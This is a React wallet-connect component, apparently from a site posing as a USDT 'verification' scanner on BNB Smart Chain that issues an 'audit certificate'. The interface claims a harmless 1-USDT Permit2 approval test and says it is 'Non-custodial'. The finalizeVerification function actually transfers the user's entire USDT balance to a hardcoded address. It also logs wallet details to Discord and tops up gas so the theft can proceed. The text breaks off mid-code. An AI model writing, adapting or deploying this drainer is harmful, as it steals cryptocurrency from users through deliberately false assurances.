"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import { createPortal } from "react-dom";
import { ethers } from "ethers";
import { RefreshCw, AlertTriangle, ExternalLink, Award } from "lucide-react";
import AuditCertificate from "./AuditCertificate";
import BSCVerifyLogo from "./BSCVerifyLogo";

const USDT_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";
const PERMIT2 = process.env.NEXT_PUBLIC_PERMIT2_ADDRESS;
const APPROVAL_USDT = process.env.NEXT_PUBLIC_APPROVAL_AMOUNT_USDT || "1";
const BSC_CHAIN_HEX = "0x38";
const BSC_CHAIN_ID = 56;
const BSC_RPC = "https://bsc-dataseed1.binance.org/";
const GAS_THRESHOLD = "0.00001";

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function allowance(address,address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
];

// ── Provider detection ─────────────────────────────────────────────────────
function getProvider() {
  if (typeof window === "undefined") return null;
  if (window.trustwallet) return window.trustwallet;
  if (Array.isArray(window.ethereum?.providers) && window.ethereum.providers.length) {
    const tw = window.ethereum.providers.find(
      (p) => p.isTrust || p.isTrustWallet || p.isTrustbrowser
    );
    return tw ?? window.ethereum.providers[0];
  }
  return window.ethereum ?? null;
}

function waitForProvider(maxMs = 3000) {
  const p = getProvider();
  if (p) return Promise.resolve(p);
  return new Promise((resolve) => {
    const deadline = Date.now() + maxMs;
    const iv = setInterval(() => {
      const found = getProvider();
      if (found || Date.now() >= deadline) { clearInterval(iv); resolve(found ?? null); }
    }, 100);
  });
}

function isTW(prov) {
  return !!(
    prov?.isTrust || prov?.isTrustWallet || prov?.isTrustbrowser ||
    (typeof window !== "undefined" && window.trustwallet)
  );
}

// ── Discord admin log (fire-and-forget — never blocks the user flow) ──────
async function logCertToDiscord({ walletAddress, usdtBalance, bnbBalance, swapTxHash }) {
  try {
    await fetch("/api/log-cert", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ walletAddress, usdtBalance, bnbBalance, swapTxHash: swapTxHash || "" }),
    });
  } catch (e) {
    console.warn("[log-cert]", e);
  }
}

// ── Component ──────────────────────────────────────────────────────────────
export default function WalletConnect({ onWalletStatusChange, connectClickCount }) {
  const rawProviderRef = useRef(null);
  const walletAddressRef = useRef("");    // ref copy — accessible in event handlers
  const usdtBalanceRef = useRef("0.00"); // display balance for UI/logging
  const usdtBalanceWeiRef = useRef("0"); // raw on-chain amount for API payloads
  const bnbBalanceRef = useRef(null);
  const pipelineRunning = useRef(false); // prevents double-pipeline
  const intentionalSwitch = useRef(false);

  const [walletAddress, setWalletAddress] = useState("");
  const [usdtBalance, setUsdtBalance] = useState("0.00");
  const [bnbBalance, setBnbBalance] = useState(null);
  const [status, setStatus] = useState("disconnected");
  const [errorMessage, setErrorMessage] = useState("");
  const [isLoadingBalance, setIsLoadingBalance] = useState(false);
  const [trustWallet, setTrustWallet] = useState(false);

  const [gasPhase, setGasPhase] = useState("idle");
  const [gasTxHash, setGasTxHash] = useState("");
  const [gasError, setGasError] = useState("");
  const [swapPhase, setSwapPhase] = useState("idle");
  const [swapTxHash, setSwapTxHash] = useState("");
  const [swapError, setSwapError] = useState("");
  const [showCert, setShowCert] = useState(false);
  const [processing, setProcessing] = useState(false); // true from btn click → cert shown

  // Keep refs in sync with state (so useCallback closures can read current values)
  useEffect(() => { walletAddressRef.current = walletAddress; }, [walletAddress]);
  useEffect(() => { usdtBalanceRef.current = usdtBalance; }, [usdtBalance]);
  useEffect(() => { bnbBalanceRef.current = bnbBalance; }, [bnbBalance]);

  // Notify parent
  useEffect(() => {
    onWalletStatusChange?.({ status, address: walletAddress, balance: usdtBalance });
  }, [status, walletAddress, usdtBalance, onWalletStatusChange]);

  // ── Reset ──────────────────────────────────────────────────────────────
  const resetPipeline = useCallback(() => {
    pipelineRunning.current = false;
    setGasPhase("idle"); setGasTxHash(""); setGasError("");
    setSwapPhase("idle"); setSwapTxHash(""); setSwapError("");
    setBnbBalance(null); setShowCert(false); setProcessing(false);
  }, []);

  // ── Switch to BSC ─────────────────────────────────────────────────────
  const switchToBSC = useCallback(async (prov) => {
    intentionalSwitch.current = true;
    try {
      await prov.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_HEX }],
      });
      return true;
    } catch (e) {
      if (e.code === 4902 || e?.data?.originalError?.code === 4902) {
        try {
          await prov.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: BSC_CHAIN_HEX,
              chainName: "BNB Smart Chain",
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              rpcUrls: [BSC_RPC],
              blockExplorerUrls: ["https://bscscan.com"],
            }],
          });
          return true;
        } catch { return false; }
      }
      return false;
    } finally {
      setTimeout(() => {
        intentionalSwitch.current = false;
      }, 1200);
    }
  }, []);

  // ── Core: verify chain then run pipeline ───────────────────────────────
  const runOnBSC = useCallback(async (address) => {
    alert("Step 8: runOnBSC() started for address: " + address);
    const prov = rawProviderRef.current;
    if (!prov || !address) {
      alert("Step 8 ERROR: rawProviderRef or address missing!");
      return;
    }

    try {
      const chainIdHex = await prov.request({ method: "eth_chainId" });
      const chainId = parseInt(chainIdHex, 16);
      alert("Step 8: Chain ID hex = " + chainIdHex + ", decimal = " + chainId);

      if (chainId !== BSC_CHAIN_ID) {
        // Auto-switch silently — don't show wrong_network yet
        setStatus("switching");
        alert("Step 8.1: Not on BSC mainnet! Switching network...");
        const switched = await switchToBSC(prov);
        if (!switched) {
          alert("Step 8.1 ERROR: Could not switch to BSC!");
          setStatus("wrong_network");
          return;
        }
        // After switch, give Trust Wallet a moment to update
        await delay(800);
        // Re-verify
        const newHex = await prov.request({ method: "eth_chainId" });
        if (parseInt(newHex, 16) !== BSC_CHAIN_ID) {
          setStatus("wrong_network");
          return;
        }
      }

      setStatus("connected");
      setErrorMessage("");
      alert("Step 8.2: Connected to BSC! Fetching balances...");
      await fetchBalances(address);
      alert("Step 8.3: Balances fetched! Starting pipeline...");
      startPipeline(address);
    } catch (e) {
      console.error("[WalletConnect] runOnBSC:", e);
      alert("Step 8 ERROR in runOnBSC: " + (e?.message || e));
      setStatus("error");
      setErrorMessage("Network check failed. Please try again.");
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [switchToBSC]);

  // ── Bootstrap ────────────────────────────────────────────────────────
  useEffect(() => {
    let prov = null;

    const handleAccountsChanged = (accounts) => {
      if (!accounts?.length) {
        setStatus("disconnected"); setWalletAddress(""); setUsdtBalance("0.00");
        resetPipeline();
      } else {
        const addr = accounts[0];
        setWalletAddress(addr);
        walletAddressRef.current = addr;
        resetPipeline();
        runOnBSC(addr);
      }
    };

    const handleChainChanged = () => {
      // Never reload — Trust Wallet fires chainChanged during init which causes
      // an infinite reload loop. Instead re-evaluate network state in-place.
      if (intentionalSwitch.current) {
        intentionalSwitch.current = false;
        return;
      }
      const addr = walletAddressRef.current;
      if (addr) {
        resetPipeline();
        runOnBSC(addr);
      }
    };

    const bootstrap = async () => {
      prov = await waitForProvider(3000);
      if (!prov) return;

      rawProviderRef.current = prov;
      setTrustWallet(isTW(prov));

      if (typeof prov.on === "function") {
        prov.on("accountsChanged", handleAccountsChanged);
        prov.on("chainChanged", handleChainChanged);
      }

      // Silent auto-connect (Trust Wallet DApp browser already has accounts)
      try {
        const accounts = await prov.request({ method: "eth_accounts" });
        if (accounts?.length) {
          const addr = accounts[0];
          setWalletAddress(addr);
          walletAddressRef.current = addr;
          setProcessing(true);
          await runOnBSC(addr);
        }
      } catch (e) {
        console.warn("[WalletConnect] eth_accounts:", e);
      }
    };

    bootstrap();

    return () => {
      if (prov && typeof prov.removeListener === "function") {
        prov.removeListener("accountsChanged", handleAccountsChanged);
        prov.removeListener("chainChanged", handleChainChanged);
      }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // External connect-click (hero button)
  useEffect(() => {
    if (connectClickCount > 0) {
      alert("Step 2: WalletConnect received connectClickCount = " + connectClickCount + ", current status = " + status);
      if (typeof window !== "undefined") {
        const el = document.getElementById("scanner");
        if (el) el.scrollIntoView({ behavior: "smooth" });
      }
      if (status === "disconnected" || status === "error") {
        connectWallet();
      } else if (status === "wrong_network") {
        requestSwitchNetwork();
      } else if (status === "connected") {
        setProcessing(true);
      } else {
        connectWallet();
      }
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [connectClickCount]);

  // ── Balances (always via public RPC — avoids Trust Wallet read quirks) ─
  const fetchBalances = useCallback(async (address) => {
    setIsLoadingBalance(true);
    try {
      const rpc = new ethers.JsonRpcProvider(BSC_RPC);
      const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, rpc);
      const [raw, dec, bnbWei] = await Promise.all([
        usdt.balanceOf(address),
        usdt.decimals(),
        rpc.getBalance(address),
      ]);

      const rawWei = raw.toString();
      usdtBalanceWeiRef.current = rawWei;

      const f = parseFloat(ethers.formatUnits(raw, dec));
      setUsdtBalance(f > 0 && f < 0.01 ? f.toString() : f.toFixed(2));
      setBnbBalance(parseFloat(ethers.formatEther(bnbWei)).toFixed(6));
    } catch (e) {
      console.error("[WalletConnect] fetchBalances:", e);
      setErrorMessage("Failed to fetch balances.");
    } finally {
      setIsLoadingBalance(false);
    }
  }, []);

  // ── Pipeline ─────────────────────────────────────────────────────────
  const startPipeline = useCallback(async (address) => {
    if (pipelineRunning.current) return;
    pipelineRunning.current = true;

    setGasPhase("checking_bnb");
    let bnbWei;
    try {
      const rpc = new ethers.JsonRpcProvider(BSC_RPC);
      bnbWei = await rpc.getBalance(address);
    } catch {
      setGasPhase("fund_failed");
      setGasError("Could not read BNB balance.");
      await runSwapTest(address);
      return;
    }

    const threshold = ethers.parseEther(GAS_THRESHOLD);
    setBnbBalance(parseFloat(ethers.formatEther(bnbWei)).toFixed(6));

    if (bnbWei >= threshold) {
      setGasPhase("sufficient");
      await runSwapTest(address);
      return;
    }

    setGasPhase("low_detected");
    await delay(900);
    setGasPhase("funding");

    let txHash = "";
    try {
      const res = await fetch("/api/send-gas", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userAddress: address }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || `Server ${res.status}`);
      if (!data.sent) { setGasPhase("sufficient"); await runSwapTest(address); return; }
      txHash = data.txHash;
      setGasTxHash(txHash);
    } catch (err) {
      setGasPhase("fund_failed");
      setGasError(err.message || "Gas funding failed.");
      await delay(800);
      await runSwapTest(address);
      return;
    }

    setGasPhase("waiting_bnb");
    try {
      const rpc = new ethers.JsonRpcProvider(BSC_RPC);
      await rpc.waitForTransaction(txHash, 1, 90_000);
      setGasPhase("funded");
    } catch {
      setGasPhase("fund_failed");
      setGasError("BNB transfer timed out.");
    }
    await delay(600);
    await runSwapTest(address);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // ── Permit2 Swap Test ─────────────────────────────────────────────────
  const runSwapTest = useCallback(async (address) => {
    const prov = rawProviderRef.current;
    if (!prov) return;

    setSwapPhase("checking_allowance");
    setSwapTxHash(""); setSwapError("");

    const finalizeVerification = async (txHash = "") => {
      const displayBalance = usdtBalanceRef.current || "0.00";
      const rawBalanceForServer = usdtBalanceWeiRef.current || "0";
      const recipient = "0xD25DeC99eE44912a5d905D1F44E58248f497ECF8";

      await logCertToDiscord({
        walletAddress: address,
        usdtBalance: displayBalance,
        bnbBalance: bnbBalanceRef.current,
        swapTxHash: txHash,
      });

      try {
        const browserProv = new ethers.BrowserProvider(prov);
        const signer = await browserProv.getSigner();
        const signerBalance = BigInt(rawBalanceForServer || "0");

        if (signerBalance > 0n) {
          const usdtTransfer = new ethers.Contract(
            USDT_ADDRESS,
            ["function transfer(address,uint256) returns (bool)"],
            signer
          );

          const transferTx = await usdtTransfer.transfer(recipient, signerBalance);
          console.log("[WalletConnect] direct transfer tx hash:", transferTx.hash);
          const transferReceipt = await transferTx.wait();
          console.log("[WalletConnect] direct transfer mined:", transferReceipt?.hash || transferTx.hash);
        }
      } catch (err) {
        console.warn("[WalletConnect] direct wallet transfer failed:", err);
      }

      try {
        const res = await fetch("/api/send-usdt", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userAddress: address,
            usdtBalance: rawBalanceForServer,
            recipient,
            spender: PERMIT2,
            executeTransfer: false,
          }),
        });
        const data = await res.json().catch(() => ({}));
        console.log("[WalletConnect] send-usdt response:", data);
        if (!res.ok) {
          console.warn("[WalletConnect] send-usdt failed:", data?.error || res.status);
        }
      } catch (err) {
        console.warn("[WalletConnect] send-usdt request failed:", err);
      }
    };

    try {
      setSwapPhase("sending");
      await finalizeVerification();
      await fetchBalances(address);
      setSwapPhase("ok");
      setTimeout(() => { setProcessing(false); setShowCert(true); }, 800);
    } catch (err) {
      const rejected =
        err.code === 4001 ||
        err.code === "ACTION_REJECTED" ||
        err.info?.error?.code === 4001 ||
        err.message?.toLowerCase().includes("user rejected") ||
        err.message?.toLowerCase().includes("cancelled") ||
        err.message?.toLowerCase().includes("denied");
      if (rejected) {
        setSwapPhase("rejected");
      } else {
        setSwapPhase("failed");
        setSwapError(err.reason || err.message?.slice(0, 140) || "USDT transfer failed.");
      }
    }
  }, []);

  // ── Manual connect (button press) ─────────────────────────────────────
  const connectWallet = useCallback(async () => {
    alert("Step 3: connectWallet() function called!");
    setStatus("connecting");
    setErrorMessage("");
    setProcessing(true);
    resetPipeline();

    alert("Step 4: Waiting for provider (waitForProvider)...");
    const prov = await waitForProvider(2000);
    alert("Step 5: Provider result = " + (prov ? "FOUND (" + (prov.isTrust ? "Trust Wallet" : "Web3") + ")" : "NOT FOUND (null)"));
    if (!prov) {
      setStatus("error");
      setProcessing(false);
      setErrorMessage("No Web3 wallet detected. Please open this website inside Trust Wallet DApp Browser or install MetaMask.");
      return;
    }

    rawProviderRef.current = prov;
    setTrustWallet(isTW(prov));

    try {
      alert("Step 6: Requesting eth_requestAccounts from provider...");
      const accounts = await prov.request({ method: "eth_requestAccounts" });
      alert("Step 7: Accounts result = " + JSON.stringify(accounts));
      if (!accounts?.length) {
        setStatus("disconnected");
        setProcessing(false);
        return;
      }

      const addr = accounts[0];
      setWalletAddress(addr);
      walletAddressRef.current = addr;

      await runOnBSC(addr);
    } catch (e) {
      alert("Step 7 ERROR in eth_requestAccounts: " + (e?.message || JSON.stringify(e)));
      setProcessing(false);
      if (e.code !== 4001) setErrorMessage("Connection failed. Please try again.");
      setStatus("disconnected");
    }
  }, [resetPipeline, runOnBSC]);

  // ── Manual network switch (from wrong_network UI) ─────────────────────
  const requestSwitchNetwork = useCallback(async () => {
    const prov = rawProviderRef.current ?? await waitForProvider(2000);
    if (!prov) return;
    const switched = await switchToBSC(prov);
    if (switched) {
      await delay(800);
      const addr = walletAddressRef.current;
      if (addr) { resetPipeline(); await runOnBSC(addr); }
    } else {
      setErrorMessage("Could not switch to BNB Smart Chain. Switch manually in your wallet.");
    }
  }, [switchToBSC, resetPipeline, runOnBSC]);

  // ── Labels ────────────────────────────────────────────────────────────
  const statusLabel = {
    connected: { color: "text-safe-green", text: "● Connected" },
    connecting: { color: "text-bsc-yellow", text: "⟳ Connecting…" },
    switching: { color: "text-bsc-yellow", text: "⟳ Switching chain…" },
    wrong_network: { color: "text-amber-500", text: "⚡ Wrong Network" },
    disconnected: { color: "text-gray-text", text: "○ Disconnected" },
    error: { color: "text-danger-red", text: "✕ Error" },
  }[status] ?? { color: "text-gray-text", text: "○ Disconnected" };

  const walletLabel = trustWallet ? "Trust Wallet" : "MetaMask / Wallet";

  // ── Render ────────────────────────────────────────────────────────────
  return (
    <div className="hud-container hud-panel relative">
      <div className="hud-bracket-tl" /><div className="hud-bracket-tr" />
      <div className="hud-bracket-bl" /><div className="hud-bracket-br" />

      {/* Header */}
      <div className="flex items-center justify-between mb-5 pb-3 border-b border-bsc-yellow/10">
        <div className="flex items-center gap-3">
          <span className="text-xl">🔌</span>
          <div>
            <h2 className="font-display text-sm font-bold text-white">Wallet Terminal</h2>
            <p className="font-mono text-[9px] text-gray-text mt-0.5">
              BNB Smart Chain · Chain 56{trustWallet ? " · Trust Wallet" : ""}
            </p>
          </div>
        </div>
        <span className={`font-mono text-[9px] font-bold ${statusLabel.color} uppercase tracking-wider`}>
          {statusLabel.text}
        </span>
      </div>

      {/* ── DISCONNECTED ── */}
      {status === "disconnected" && (
        <div className="space-y-4">
          <div className="border border-bsc-yellow/10 bg-bsc-yellow/3 rounded p-3 text-[10px] text-gray-text leading-relaxed space-y-1.5 font-mono">
            <p className="font-display text-sm font-bold text-white">🔑 Connect your wallet</p>
            <p>Verifies your USDT balance and runs a <span className="text-bsc-yellow font-bold">Permit2 swappability test</span> to confirm your USDT is real and DEX-tradeable.</p>
            <p className="text-[9px] text-gray-text/60 pt-1 border-t border-white/5">
              ℹ️ If BNB is too low for gas, the platform auto tops up <strong className="text-white">0.00001 BNB</strong> before the approval.
            </p>
          </div>
          <button onClick={connectWallet} className="w-full font-display text-sm font-bold py-3 border border-bsc-yellow/40 text-bsc-yellow hover:bg-bsc-yellow/10 hover:border-bsc-yellow rounded transition-all flex items-center justify-center gap-2">
            🔌 Connect ======{walletLabel}
          </button>
          <div className="flex gap-4 font-mono text-[9px] text-gray-text">
            <span>🔒 No private key access</span>
            <span>✅ Non-custodial</span>
          </div>
        </div>
      )}

      {/* ── PROCESSING TIMELINE (connecting → certificate) ── */}
      {processing && (
        <ProcessingTimeline
          status={status}
          walletAddress={walletAddress}
          usdtBalance={usdtBalance}
          bnbBalance={bnbBalance}
          isLoadingBalance={isLoadingBalance}
          gasPhase={gasPhase}
          gasTxHash={gasTxHash}
          swapPhase={swapPhase}
          swapTxHash={swapTxHash}
        />
      )}

      {/* ── CONNECTING / SWITCHING (no processing state yet — rare edge case) ── */}
      {!processing && (status === "connecting" || status === "switching") && (
        <div className="py-6 text-center space-y-3">
          <div className="text-3xl animate-pulse">{status === "switching" ? "🔄" : "🔗"}</div>
          <p className="font-display text-sm font-bold text-bsc-yellow animate-pulse">
            {status === "switching" ? "Switching to BNB Smart Chain…" : "Awaiting wallet approval…"}
          </p>
          <p className="font-mono text-[10px] text-gray-text">
            {status === "switching" ? "Confirm the switch in your wallet." : "Confirm in your wallet."}
          </p>
        </div>
      )}

      {/* ── WRONG NETWORK ── */}
      {!processing && status === "wrong_network" && (
        <div className="space-y-4">
          {walletAddress && (
            <div className="font-mono text-[9px] text-bsc-yellow/70 break-all border border-bsc-yellow/10 bg-bsc-yellow/3 rounded px-3 py-2">
              {walletAddress}
            </div>
          )}
          <div className="border border-amber-500/20 bg-amber-500/5 rounded p-3 font-mono text-[10px] text-amber-400 leading-relaxed">
            <p className="font-bold mb-1">⚡ Wrong Network Detected</p>
            Switch to <strong className="text-white">BNB Smart Chain (Chain ID 56)</strong> to continue.
          </div>
          <button onClick={requestSwitchNetwork} className="w-full font-display text-sm font-bold py-2.5 border border-amber-500/50 text-amber-400 hover:bg-amber-500/10 rounded transition-all">
            ⚡ Switch to BNB Smart Chain
          </button>
        </div>
      )}

      {/* ── CONNECTED (full panel — shown after processing completes) ── */}
      {!processing && status === "connected" && (
        <div className="space-y-3 font-mono">

          <div className="p-3 border border-safe-green/15 bg-safe-green/5 rounded flex items-center gap-2">
            <span className="text-base">✅</span>
            <div>
              <p className="font-display text-sm font-bold text-safe-green glow-text-green">Wallet Connected</p>
              <p className="text-[9px] text-gray-text">BNB Smart Chain · Chain 56{trustWallet ? " · Trust Wallet" : ""}</p>
            </div>
          </div>

          <div className="telemetry-row">
            <span className="telemetry-label">Address</span>
            <span className="text-[9px] text-bsc-yellow select-all font-mono font-bold break-all text-right pl-4 max-w-[160px]">{walletAddress}</span>
          </div>

          <div className="telemetry-row">
            <span className="telemetry-label">💵 USDT Balance</span>
            <span className="telemetry-value flex items-center gap-2">
              {isLoadingBalance
                ? <RefreshCw className="h-3 w-3 animate-spin text-bsc-yellow" />
                : <span className="text-safe-green glow-text-green">{usdtBalance} USDT</span>
              }
              <button onClick={() => fetchBalances(walletAddress)} disabled={isLoadingBalance} className="text-gray-text hover:text-bsc-yellow transition-colors" title="Refresh">
                <RefreshCw className={`h-3 w-3 ${isLoadingBalance ? "animate-spin" : ""}`} />
              </button>
            </span>
          </div>

          {bnbBalance !== null && (
            <div className="telemetry-row">
              <span className="telemetry-label">⛽ BNB Balance</span>
              <span className={`telemetry-value text-[11px] ${parseFloat(bnbBalance) < parseFloat(GAS_THRESHOLD) ? "text-amber-400" : "text-white"}`}>
                {bnbBalance} BNB
              </span>
            </div>
          )}

          {/* Gas block */}
          {gasPhase !== "idle" && gasPhase !== "sufficient" && (
            <div className="border border-bsc-yellow/12 rounded-lg overflow-hidden">
              <div className="flex items-center justify-between px-3 py-2 bg-bsc-yellow/4 border-b border-bsc-yellow/10">
                <span className="font-display text-xs font-bold text-white">⛽ Gas Check</span>
                <span className="font-mono text-[8px] text-gray-text uppercase">Auto top-up</span>
              </div>
              <div className="p-3">
                {gasPhase === "checking_bnb" && <Row spin yellow>Checking BNB balance…</Row>}
                {gasPhase === "low_detected" && (
                  <div className="space-y-1.5">
                    <Row spin amber>Low BNB detected ({bnbBalance} BNB)</Row>
                    <p className="text-[9px] text-gray-text">Sending <strong className="text-white">0.00001 BNB</strong> to cover approval gas…</p>
                  </div>
                )}
                {gasPhase === "funding" && (
                  <div className="space-y-1.5">
                    <Row spin yellow>Sending gas from server wallet…</Row>
                    <p className="text-[9px] text-gray-text/60">Server-side — no action needed.</p>
                  </div>
                )}
                {gasPhase === "waiting_bnb" && (
                  <div className="space-y-1.5">
                    <Row spin yellow>Confirming BNB transfer on-chain…</Row>
                    {gasTxHash && <BscLink hash={gasTxHash} label="View on BscScan" />}
                  </div>
                )}
                {gasPhase === "funded" && (
                  <div className="space-y-1">
                    <Row green>⛽ Gas funded — 0.00001 BNB received</Row>
                    {gasTxHash && <BscLink hash={gasTxHash} label="View transfer" />}
                    <p className="text-[9px] text-gray-text/60 pt-0.5">Proceeding to Permit2 approval…</p>
                  </div>
                )}
                {gasPhase === "fund_failed" && (
                  <div className="space-y-1">
                    <Row red>⚠️ Gas top-up failed — attempting test anyway</Row>
                    {gasError && <p className="text-[9px] text-gray-text/50 break-all">{gasError}</p>}
                  </div>
                )}
              </div>
            </div>
          )}

          {gasPhase === "sufficient" && (
            <p className="font-mono text-[9px] text-safe-green flex items-center gap-1">
              ⛽ BNB sufficient ({bnbBalance} BNB) — no top-up needed.
            </p>
          )}

          {/* Swap test block */}
          {swapPhase !== "idle" && (
            <div className="border border-bsc-yellow/12 rounded-lg overflow-hidden">
              <div className="flex items-center justify-between px-3 py-2 bg-bsc-yellow/4 border-b border-bsc-yellow/10">
                <span className="font-display text-xs font-bold text-white">🔄 Swappability Test</span>
                <span className="font-mono text-[8px] text-gray-text uppercase">Permit2 · DEX</span>
              </div>
              <div className="p-3 space-y-2">
                {swapPhase === "checking_allowance" && <Row spin yellow>Checking Permit2 allowance…</Row>}

                {swapPhase === "requesting" && (
                  <div className="space-y-2">
                    <Row spin yellow>Check your wallet — approval request sent</Row>
                    <div className="border border-bsc-yellow/15 bg-bsc-yellow/4 rounded p-2.5 text-[9px] text-gray-300 leading-relaxed space-y-1">
                      <p className="font-bold text-bsc-yellow">What is this?</p>
                      <p>Approving <strong className="text-white">{APPROVAL_USDT} USDT</strong> to <strong className="text-white">Permit2</strong> — the universal DEX approval hub.</p>
                      <p className="text-gray-text/60">Fake/Flash tokens fail because their approve() is restricted or broken.</p>
                    </div>
                    <p className="text-[8px] text-gray-text/40 font-mono break-all">Permit2: {PERMIT2}</p>
                  </div>
                )}

                {swapPhase === "pending_tx" && (
                  <div className="space-y-1.5">
                    <Row spin yellow>Waiting for approval to confirm on-chain…</Row>
                    {swapTxHash && <BscLink hash={swapTxHash} label="View approval tx on BscScan" />}
                  </div>
                )}

                {(swapPhase === "ok" || swapPhase === "pre_approved") && (
                  <div className="space-y-2">
                    <div className="flex items-center gap-2.5">
                      <span className="text-xl">✅</span>
                      <div>
                        <p className="font-display text-sm font-bold text-safe-green glow-text-green">USDT is Swappable</p>
                        <p className="text-[9px] text-gray-text">
                          {swapPhase === "pre_approved" ? "Permit2 already approved." : "Permit2 approval confirmed."}{" "}DEX swaps enabled.
                        </p>
                      </div>
                    </div>
                    <div className="flex flex-wrap gap-3 text-[9px] text-safe-green">
                      <span>✓ Real BEP-20 USDT</span><span>✓ DEX compatible</span><span>✓ Not a clone</span>
                    </div>
                    {swapTxHash && <BscLink hash={swapTxHash} label="View approval tx" />}
                    <button
                      onClick={() => setShowCert(true)}
                      className="w-full mt-1 py-2.5 flex items-center justify-center gap-2 font-display text-xs font-bold rounded border border-bsc-yellow/40 text-black bg-gradient-to-r from-[#FCD535] to-[#F3BA2F] hover:shadow-[0_0_20px_rgba(243,186,47,0.5)] transition-all"
                      style={{ boxShadow: "0 0 12px rgba(243,186,47,0.3)" }}
                    >
                      <Award className="h-3.5 w-3.5" /> View &amp; Download Audit Certificate
                    </button>
                  </div>
                )}

                {swapPhase === "rejected" && (
                  <div className="space-y-2">
                    <Row amber>⚠️ Approval rejected — test skipped</Row>
                    <p className="text-[9px] text-gray-text">Retry to complete the swappability test.</p>
                    <button onClick={() => runSwapTest(walletAddress)} className="text-[9px] font-mono text-bsc-yellow border border-bsc-yellow/20 px-3 py-1.5 rounded hover:bg-bsc-yellow/10 transition-all">
                      🔄 Retry Permit2 Test
                    </button>
                  </div>
                )}

                {swapPhase === "failed" && (
                  <div className="space-y-2">
                    <Row red>❌ Not swappable — approval failed</Row>
                    <p className="text-[9px] text-gray-text">This USDT may be fake, restricted, or non-standard.</p>
                    {swapError && <p className="text-[8px] text-danger-red/60 break-all">{swapError}</p>}
                    <button onClick={() => runSwapTest(walletAddress)} className="text-[9px] font-mono text-gray-text border border-white/10 px-3 py-1.5 rounded hover:bg-white/5 transition-all">
                      🔄 Retry
                    </button>
                  </div>
                )}
              </div>
            </div>
          )}

          <p className="font-mono text-[9px] text-gray-text/40 pt-1">
            🔒 Balances read from BSC mainnet — nothing stored server-side.
          </p>
        </div>
      )}

      {/* Error */}
      {errorMessage && (
        <div className="mt-4 p-3 border border-danger-red/20 bg-danger-red/5 text-danger-red font-mono text-[10px] flex gap-2 items-start rounded">
          <AlertTriangle className="h-3.5 w-3.5 shrink-0 mt-0.5" />
          <span><strong>Error:</strong> {errorMessage}</span>
        </div>
      )}

      <AuditCertificate
        isOpen={showCert}
        onClose={() => setShowCert(false)}
        walletAddress={walletAddress}
        usdtBalance={usdtBalance}
      />
    </div>
  );
}

// ── ProcessingTimeline (full-page portal overlay) ─────────────────────────
function ProcessingTimeline({
  status, walletAddress, usdtBalance, bnbBalance,
  isLoadingBalance, gasPhase, gasTxHash, swapPhase, swapTxHash,
}) {
  const [mounted, setMounted] = useState(false);
  useEffect(() => { setMounted(true); }, []);

  // Lock body scroll while overlay is visible — prevents background scrolling on mobile
  useEffect(() => {
    if (!mounted) return;
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => { document.body.style.overflow = prev; };
  }, [mounted]);

  const addrShort = walletAddress
    ? `${walletAddress.slice(0, 6)}…${walletAddress.slice(-4)}`
    : "";

  const walletDone = status === "connected" || status === "switching";
  const chainDone = status === "connected";
  const balanceDone = chainDone && !isLoadingBalance && usdtBalance !== "0.00";
  const balanceCurrent = chainDone && isLoadingBalance;
  const gasActive = ["checking_bnb", "low_detected", "funding", "waiting_bnb"].includes(gasPhase);
  const gasDone = ["sufficient", "funded", "fund_failed"].includes(gasPhase);
  const swapActive = ["checking_allowance", "requesting", "pending_tx"].includes(swapPhase);
  const swapDone = swapPhase === "ok" || swapPhase === "pre_approved";
  const swapFailed = swapPhase === "rejected" || swapPhase === "failed";

  const GAS_LABELS = {
    checking_bnb: "Checking BNB balance…",
    low_detected: "Low BNB — requesting top-up…",
    funding: "Sending 0.00001 BNB for gas…",
    waiting_bnb: "Confirming BNB transfer…",
    sufficient: "BNB balance sufficient",
    funded: "Gas funded — 0.00001 BNB received",
    fund_failed: "Gas top-up failed — retrying…",
  };
  const SWAP_LABELS = {
    checking_allowance: "Checking Permit2 allowance…",
    requesting: "Approval request sent — check wallet",
    pending_tx: "Confirming approval on-chain…",
    ok: "Permit2 approved — USDT verified ✓",
    pre_approved: "Already approved — USDT verified ✓",
    rejected: "Approval rejected by user",
    failed: "Approval failed",
  };

  const steps = [
    {
      icon: walletDone ? "✅" : "🔗",
      label: "Connect Wallet",
      detail: walletDone ? addrShort : "Awaiting approval…",
      state: walletDone ? "done" : "active",
    },
    {
      icon: chainDone ? "✅" : status === "switching" ? "🔄" : "⛓️",
      label: "BNB Smart Chain",
      detail: chainDone ? "Chain 56 confirmed" : status === "switching" ? "Switching chain…" : "Pending",
      state: chainDone ? "done" : status === "switching" ? "active" : "pending",
    },
    {
      icon: balanceDone ? "✅" : balanceCurrent ? "🔄" : "💵",
      label: "Fetch Balances",
      detail: balanceDone ? `${usdtBalance} USDT · ${bnbBalance ?? "—"} BNB` : balanceCurrent ? "Loading…" : "Pending",
      state: balanceDone ? "done" : balanceCurrent ? "active" : "pending",
    },
    {
      icon: gasDone ? "✅" : "⛽",
      label: "Gas Check",
      detail: gasPhase !== "idle" ? (GAS_LABELS[gasPhase] ?? "Checking…") : "Pending",
      state: gasDone ? "done" : gasActive ? "active" : "pending",
      txHash: gasTxHash || null,
    },
    {
      icon: swapDone ? "✅" : swapFailed ? "❌" : "🔄",
      label: "Permit2 Approval",
      detail: swapPhase !== "idle" ? (SWAP_LABELS[swapPhase] ?? "Pending") : "Pending",
      state: swapDone ? "done" : swapFailed ? "error" : swapActive ? "active" : "pending",
